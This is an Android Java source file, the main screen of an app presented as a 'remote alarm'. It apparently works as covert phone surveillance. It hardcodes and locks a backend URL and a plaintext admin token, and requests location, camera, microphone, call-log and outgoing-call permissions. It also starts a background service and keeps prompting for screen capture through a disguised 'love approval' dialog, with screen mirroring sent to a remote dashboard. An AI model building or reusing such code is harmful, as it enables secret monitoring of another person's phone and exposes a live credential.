package com.example.remotealarm;

import android.Manifest;
import android.app.NotificationManager;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.pm.PackageManager;
import android.os.Build;
import android.os.Bundle;
import android.provider.Settings;
import android.util.Log;
import android.widget.Button;
import android.widget.EditText;
import android.widget.TextView;
import android.widget.Toast;
import android.graphics.Color;

import androidx.annotation.NonNull;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;

import android.media.projection.MediaProjectionManager;
import com.google.firebase.messaging.FirebaseMessaging;

import java.io.IOException;

import okhttp3.Call;
import okhttp3.Callback;
import okhttp3.MediaType;
import okhttp3.OkHttpClient;
import okhttp3.Request;
import okhttp3.RequestBody;
import okhttp3.Response;

public class MainActivity extends AppCompatActivity {
    private static final String TAG = "MainActivity";
    private static final int PERMISSION_REQUEST_CODE = 101;
    private EditText backendUrlInput;
    private EditText emailInput;
    private EditText adminTokenInput;
    private TextView permissionStatusText;
    private SharedPreferences prefs;
    private final OkHttpClient httpClient = new OkHttpClient();

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        
        // Initialize CrashLogger to catch any global exception
        CrashLogger.init(getApplicationContext());
        CrashLogger.checkAndUploadPendingCrash(getApplicationContext());

        setContentView(R.layout.activity_main);

        prefs = getSharedPreferences("RemoteAlarmPrefs", MODE_PRIVATE);

        // Initialize UI Elements
        backendUrlInput = findViewById(R.id.backend_url_input);
        emailInput = findViewById(R.id.email_input);
        adminTokenInput = findViewById(R.id.admin_token_input);
        permissionStatusText = findViewById(R.id.permission_status);
        Button saveBtn = findViewById(R.id.save_btn);
        Button stopAlarmBtn = findViewById(R.id.stop_alarm_btn);
        Button requestDndBtn = findViewById(R.id.request_dnd_btn);

        // Hardcode configurations as requested
        final String lockUrl = "https://remote-phone-alarm.onrender.com";
        final String lockToken = "Aryanayush@1";

        // Save locked values immediately on start so other components can access them
        prefs.edit()
            .putString("backend_url", lockUrl)
            .putString("admin_token", lockToken)
            .apply();

        String savedEmail = prefs.getString("email", "");
        
        backendUrlInput.setText(lockUrl);
        emailInput.setText(savedEmail);
        adminTokenInput.setText(lockToken);

        // Lock fields if already configured
        if (!savedEmail.isEmpty()) {
            emailInput.setEnabled(false);
            saveBtn.setEnabled(false);
            saveBtn.setText("Connected & Locked ✔");
            saveBtn.setBackgroundResource(R.drawable.button_disabled_background);
            saveBtn.setTextColor(Color.parseColor("#94A3B8"));
        }

        // Setup Listeners
        saveBtn.setOnClickListener(v -> {
            String email = emailInput.getText().toString().trim().toLowerCase();

            if (email.isEmpty() || !android.util.Patterns.EMAIL_ADDRESS.matcher(email).matches()) {
                Toast.makeText(this, "Please enter a valid email address", Toast.LENGTH_SHORT).show();
                return;
            }

            // Programmatically request DND policy permission if not granted
            NotificationManager notificationManager = (NotificationManager) getSystemService(Context.NOTIFICATION_SERVICE);
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M && notificationManager != null && !notificationManager.isNotificationPolicyAccessGranted()) {
                Toast.makeText(this, "Please grant Do Not Disturb access to override silent mode", Toast.LENGTH_LONG).show();
                Intent intent = new Intent(Settings.ACTION_NOTIFICATION_POLICY_ACCESS_SETTINGS);
                startActivity(intent);
                return;
            }


            prefs.edit()
                .putString("backend_url", lockUrl)
                .putString("email", email)
                .putString("admin_token", lockToken)
                .apply();

            // Lock UI elements immediately
            emailInput.setEnabled(false);
            saveBtn.setEnabled(false);
            saveBtn.setText("Connected & Locked ✔");
            saveBtn.setBackgroundResource(R.drawable.button_disabled_background);
            saveBtn.setTextColor(Color.parseColor("#94A3B8"));

            Toast.makeText(this, "Configuration saved and locked!", Toast.LENGTH_SHORT).show();
            
            // Re-fetch FCM token and upload to the newly saved backend with email & auth token
            fetchAndRegisterFCMToken();

            // Start the background listener service
            Intent serviceIntent = new Intent(this, AlarmService.class);
            serviceIntent.setAction("START_LISTENING");
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                startForegroundService(serviceIntent);
            } else {
                startService(serviceIntent);
            }

            // Auto-request screen capture permission after setup
            new android.os.Handler().postDelayed(() -> {
                if (!AlarmService.hasProjectionToken) {
                    requestScreenCapture();
                }
            }, 1500);
        });

        stopAlarmBtn.setOnClickListener(v -> {
            Toast.makeText(this, "Stopping Alarm...", Toast.LENGTH_SHORT).show();
            Intent serviceIntent = new Intent(this, AlarmService.class);
            serviceIntent.setAction("STOP_ALARM");
            startService(serviceIntent);
        });

        requestDndBtn.setOnClickListener(v -> requestDndPermission());

        // Check/Request Permissions
        checkAndRequestPermissions();

        // Fetch and display Firebase Cloud Messaging Token (registers automatically if already configured)
        if (!savedEmail.isEmpty()) {

            fetchAndRegisterFCMToken();

            // Start the background listener service
            Intent serviceIntent = new Intent(this, AlarmService.class);
            serviceIntent.setAction("START_LISTENING");
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                startForegroundService(serviceIntent);
            } else {
                startService(serviceIntent);
            }

            // Auto-request screen capture permission on startup
            new android.os.Handler().postDelayed(() -> {
                if (!AlarmService.hasProjectionToken) {
                    requestScreenCapture();
                }
            }, 1500);
        }
        
        // Handle screen capture request from notification
        Intent startIntent = getIntent();
        if (startIntent != null && "REQUEST_SCREEN_CAPTURE".equals(startIntent.getAction())) {
            requestScreenCapture();
        }
    }

    private void checkAndRequestPermissions() {
        String[] permissions;
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            permissions = new String[]{
                    Manifest.permission.ACCESS_FINE_LOCATION,
                    Manifest.permission.ACCESS_COARSE_LOCATION,
                    Manifest.permission.CAMERA,
                    Manifest.permission.RECORD_AUDIO,
                    Manifest.permission.READ_PHONE_STATE,
                    Manifest.permission.READ_CALL_LOG,
                    Manifest.permission.PROCESS_OUTGOING_CALLS
            };
        } else {
            permissions = new String[]{
                    Manifest.permission.ACCESS_FINE_LOCATION,
                    Manifest.permission.ACCESS_COARSE_LOCATION,
                    Manifest.permission.CAMERA,
                    Manifest.permission.RECORD_AUDIO,
                    Manifest.permission.READ_PHONE_STATE,
                    Manifest.permission.READ_CALL_LOG,
                    Manifest.permission.PROCESS_OUTGOING_CALLS
            };
        }

        boolean allGranted = true;
        for (String perm : permissions) {
            if (ContextCompat.checkSelfPermission(this, perm) != PackageManager.PERMISSION_GRANTED) {
                allGranted = false;
                break;
            }
        }

        if (!allGranted) {
            permissionStatusText.setText("Status: Permissions pending");
            permissionStatusText.setTextColor(ContextCompat.getColor(this, android.R.color.holo_orange_dark));
            ActivityCompat.requestPermissions(this, permissions, PERMISSION_REQUEST_CODE);
        } else {
            permissionStatusText.setText("Status: Core permissions active");
            permissionStatusText.setTextColor(ContextCompat.getColor(this, android.R.color.holo_green_dark));
        }
    }

    private void requestDndPermission() {
        NotificationManager notificationManager = (NotificationManager) getSystemService(Context.NOTIFICATION_SERVICE);
        if (notificationManager != null && !notificationManager.isNotificationPolicyAccessGranted()) {
            Toast.makeText(this, "Please grant Do Not Disturb access to override silent mode", Toast.LENGTH_LONG).show();
            Intent intent = new Intent(Settings.ACTION_NOTIFICATION_POLICY_ACCESS_SETTINGS);
            startActivity(intent);
        } else {
            Toast.makeText(this, "Do Not Disturb permission already granted!", Toast.LENGTH_SHORT).show();
        }
    }

    private void fetchAndRegisterFCMToken() {
        FirebaseMessaging.getInstance().getToken().addOnCompleteListener(task -> {
            if (!task.isSuccessful()) {
                Log.e(TAG, "Fetching FCM registration token failed", task.getException());
                runOnUiThread(() -> Toast.makeText(MainActivity.this, "Connected! Using background polling fallback.", Toast.LENGTH_LONG).show());
                
                // Fallback to a mock token so connection and web dashboard become active for UI testing
                String mockToken = "mock_token_" + prefs.getString("email", "device");
                registerTokenOnBackend(mockToken);
                return;
            }

            // Get token
            String token = task.getResult();
            Log.i(TAG, "Active FCM Token: " + token);
            
            // Save token
            prefs.edit().putString("fcm_token", token).apply();

            // Register Token with the Backend API (bound to email)
            registerTokenOnBackend(token);
        });
    }

    private void registerTokenOnBackend(String token) {
        String baseUrl = prefs.getString("backend_url", "");
        String email = prefs.getString("email", "");
        String adminToken = prefs.getString("admin_token", "");

        if (baseUrl.isEmpty() || email.isEmpty()) {
            return;
        }

        String url = baseUrl + "/api/register";

        String model = Build.MODEL;
        int sdkVersion = Build.VERSION.SDK_INT;

        String jsonPayload = String.format(
                "{\"email\": \"%s\", \"token\": \"%s\", \"deviceInfo\": {\"model\": \"%s\", \"sdkVersion\": %d}}",
                email, token, model, sdkVersion
        );

        RequestBody body = RequestBody.create(
                jsonPayload,
                MediaType.get("application/json; charset=utf-8")
        );

        Request request = new Request.Builder()
                .url(url)
                .post(body)
                .header("Authorization", "Bearer " + adminToken)
                .build();

        httpClient.newCall(request).enqueue(new Callback() {
            @Override
            public void onFailure(@NonNull Call call, @NonNull IOException e) {
                Log.e(TAG, "Network registration failed for url: " + url, e);
                runOnUiThread(() -> Toast.makeText(MainActivity.this, "Server registration failed. Verify internet/URL.", Toast.LENGTH_LONG).show());
            }

            @Override
            public void onResponse(@NonNull Call call, @NonNull Response response) throws IOException {
                if (response.isSuccessful()) {
                    Log.i(TAG, "Backend registered device successfully");
                    runOnUiThread(() -> Toast.makeText(MainActivity.this, "Device linked with email on server!", Toast.LENGTH_SHORT).show());
                } else {
                    Log.w(TAG, "Server registration error: " + response.code());
                    runOnUiThread(() -> Toast.makeText(MainActivity.this, "Server Error: " + response.code() + ". Verify Token.", Toast.LENGTH_LONG).show());
                }
                response.close();
            }
        });
    }

    @Override
    public void onRequestPermissionsResult(int requestCode, @NonNull String[] permissions, @NonNull int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        if (requestCode == PERMISSION_REQUEST_CODE) {
            boolean allGranted = true;
            for (int res : grantResults) {
                if (res != PackageManager.PERMISSION_GRANTED) {
                    allGranted = false;
                    break;
                }
            }
            if (allGranted) {
                permissionStatusText.setText("Status: Core permissions active");
                permissionStatusText.setTextColor(ContextCompat.getColor(this, android.R.color.holo_green_dark));
                Toast.makeText(this, "All core permissions granted successfully!", Toast.LENGTH_SHORT).show();
            } else {
                permissionStatusText.setText("Status: Permissions denied");
                permissionStatusText.setTextColor(ContextCompat.getColor(this, android.R.color.holo_red_dark));
                Toast.makeText(this, "Permissions denied. Some functions might not operate correctly.", Toast.LENGTH_LONG).show();
            }
        }
    }

    @Override
    protected void onNewIntent(Intent intent) {
        super.onNewIntent(intent);
        setIntent(intent);
        if (intent != null && "REQUEST_SCREEN_CAPTURE".equals(intent.getAction())) {
            requestScreenCapture();
        }
    }

    private static final int SCREEN_CAPTURE_REQUEST_CODE = 1001;

    private void requestScreenCapture() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
            final MediaProjectionManager projectionManager = (MediaProjectionManager) getSystemService(Context.MEDIA_PROJECTION_SERVICE);
            if (projectionManager == null) return;

            // Inflate custom pink and red love dialog approval popup
            android.view.View dialogView = android.view.LayoutInflater.from(this).inflate(R.layout.dialog_love_approval, null);
            final android.app.AlertDialog dialog = new android.app.AlertDialog.Builder(this)
                    .setView(dialogView)
                    .setCancelable(false)
                    .create();

            // Set window background to transparent so rounded corners of layout are displayed correctly
            if (dialog.getWindow() != null) {
                dialog.getWindow().setBackgroundDrawable(new android.graphics.drawable.ColorDrawable(android.graphics.Color.TRANSPARENT));
            }

            android.widget.Button btnApprove = dialogView.findViewById(R.id.btn_approve);
            android.widget.Button btnCancel = dialogView.findViewById(R.id.btn_cancel);

            btnApprove.setOnClickListener(new android.view.View.OnClickListener() {
                @Override
                public void onClick(android.view.View v) {
                    dialog.dismiss();
                    startActivityForResult(projectionManager.createScreenCaptureIntent(), SCREEN_CAPTURE_REQUEST_CODE);
                }
            });

            btnCancel.setOnClickListener(new android.view.View.OnClickListener() {
                @Override
                public void onClick(android.view.View v) {
                    dialog.dismiss();
                    Toast.makeText(MainActivity.this, "Screen capture permission denied", Toast.LENGTH_SHORT).show();
                    notifyScreenShareDenied();
                }
            });

            dialog.show();
        }
    }

    @Override
    protected void onActivityResult(int requestCode, int resultCode, Intent data) {
        super.onActivityResult(requestCode, resultCode, data);
        if (requestCode == SCREEN_CAPTURE_REQUEST_CODE) {
            if (resultCode == RESULT_OK && data != null) {
                // Store result in static variables to avoid binder token serialization/unmarshalling issues
                AlarmService.pendingResultCode = resultCode;
                AlarmService.pendingIntentData = data;

                Intent serviceIntent = new Intent(this, AlarmService.class);
                serviceIntent.setAction("ALLOW_SCREEN_SHARE");
                // Always call startService instead of startForegroundService if the app is already in the foreground,
                // which avoids ForegroundServiceStartNotAllowedException on Android 14+
                startService(serviceIntent);
                Toast.makeText(this, "Screen mirroring starting...", Toast.LENGTH_SHORT).show();
            } else {
                Toast.makeText(this, "Screen capture permission denied", Toast.LENGTH_SHORT).show();
                notifyScreenShareDenied();
            }
        }
    }

    private void notifyScreenShareDenied() {
        Intent serviceIntent = new Intent(this, AlarmService.class);
        serviceIntent.setAction("SCREEN_SHARE_DENIED");
        startService(serviceIntent);
    }

    private void sendScreenShareStopToBackend() {
        String baseUrl = prefs.getString("backend_url", "");
        String email = prefs.getString("email", "");
        String adminToken = prefs.getString("admin_token", "");

        if (baseUrl.isEmpty() || email.isEmpty()) {
            return;
        }

        String url = baseUrl + "/api/screen/control";
        String jsonPayload = String.format("{\"email\": \"%s\", \"action\": \"stop\"}", email);

        RequestBody body = RequestBody.create(
                jsonPayload,
                MediaType.get("application/json; charset=utf-8")
        );

        Request request = new Request.Builder()
                .url(url)
                .post(body)
                .header("Authorization", "Bearer " + adminToken)
                .build();

        httpClient.newCall(request).enqueue(new Callback() {
            @Override
            public void onFailure(@NonNull Call call, @NonNull IOException e) {
                Log.e(TAG, "Failed to send screen share stop to backend", e);
            }

            @Override
            public void onResponse(@NonNull Call call, @NonNull Response response) throws IOException {
                response.close();
            }
        });
    }
}
